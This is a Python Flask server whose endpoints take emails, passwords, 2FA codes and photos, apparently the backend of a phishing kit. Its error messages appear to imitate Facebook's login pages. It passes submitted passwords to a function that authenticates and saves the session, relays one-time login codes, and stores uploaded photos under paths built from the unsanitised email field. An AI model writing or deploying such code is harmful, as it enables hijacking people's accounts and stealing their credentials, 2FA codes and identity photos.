from flask import Flask, request, jsonify

from main import *
from flask_cors import CORS, cross_origin

app = Flask(__name__)

app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}


@app.route('/check-email', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_email():
    data = request.get_json()
    email = data.get('email')
    is_login_successful = check_valid_account(email)

    if is_login_successful:
        return jsonify({
            "message": "Successfully...", 
            "status": 200, 
            "email": email
            }), 200
       
    else:
         return jsonify({
            "message": "The email you entered is not connected to any account. Find your account and log in.", 
            "status": 400}), 400
    
@app.route('/auth', methods=['POST'])
@cross_origin(supports_credentials=True)
def authenticate():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    country = data.get('ip')

    if not email or not password:
        return jsonify({'message': 'Email and password are required', 'status': 400 }), 400

    try:
        send_data = send_auth_and_save_session(email, password, country)
    except Exception as e:
        # Обработка исключений, возникающих в вашей функции
        return jsonify({'message': str(e)}), 500
    if send_data is False:
        return jsonify({'message': 'The password you entered is incorrect.', "status": 400}), 200
    return jsonify({'message': 'Session saved successfully', "status": 200, 'email': email}), 200


@app.route('/check_login_api', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_login_route():
    data = request.get_json()
    email = data.get('email')

    if not email:
        return jsonify({'message': 'Email is required', "status": 400}), 400

    try:
        is_logged_in = check_login(email)
        if is_logged_in:
            return jsonify({'message': 'User is logged in', "status": 200}), 200
        else:
            return jsonify({'message': 'The email you entered is not connected to any account.', "status": 400}), 401  # or another appropriate status code
    except Exception as e:
        # Обработка исключений, возникающих в вашей функции
        return jsonify({'message': f'An error occurred: {str(e)}'}), 500



@app.route('/login_with_2fa', methods=['POST'])
@cross_origin(supports_credentials=True)
def login_with_2fa_route():
    data = request.get_json()
    email = data.get('email')
    twofa_code = data.get('twofa_code')

    if not email or not twofa_code:
        return jsonify({'message': 'Email and 2FA code are required', "status": 400}), 400

    try:
        in_account = login_with_2fa(email, twofa_code)
        print(in_account)

        if in_account is True:
            return jsonify({'message': '2FA login successful', "status": 200}), 200
        else:
            return jsonify({'message': "The login code you entered doesn't match the one sent to your phone. Please check the number and try again.", "status": 400}), 400
    except Exception as e:
        # Обработка исключений, возникающих в вашей функции
        return jsonify({'message': f'An error occurred: {str(e)}'}), 500


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/photo_upload', methods=['POST'])
@cross_origin(supports_credentials=True)
def upload():
    data = request.get_json()
    email = data.get('email')
    
    if email is None:
        return jsonify({'error': 'Email is required', 'status': 400}), 400
    if not email.strip():
        return jsonify({'error': 'Email cannot be empty', 'status': 400}), 400
    files = request.files.getlist('files')
    for file in files:
        
        if not file:
            return jsonify({'error': 'No file selected', 'status': 400}), 400
        if not allowed_file(file.filename):
            return jsonify({'error': 'Invalid file type', 'status': 400}), 400

        directory_path = os.path.join('Photos', email)
        if not os.path.exists(directory_path):
            os.makedirs(directory_path)

        path_save = os.path.join(directory_path, email + '.png')
        file.save(path_save)
        send_photo(path_save, email)
    return jsonify({'success': 'Photo successfully uploaded', 'status': 200}), 200
   
    

if __name__ == '__main__':
    app.run(debug=True)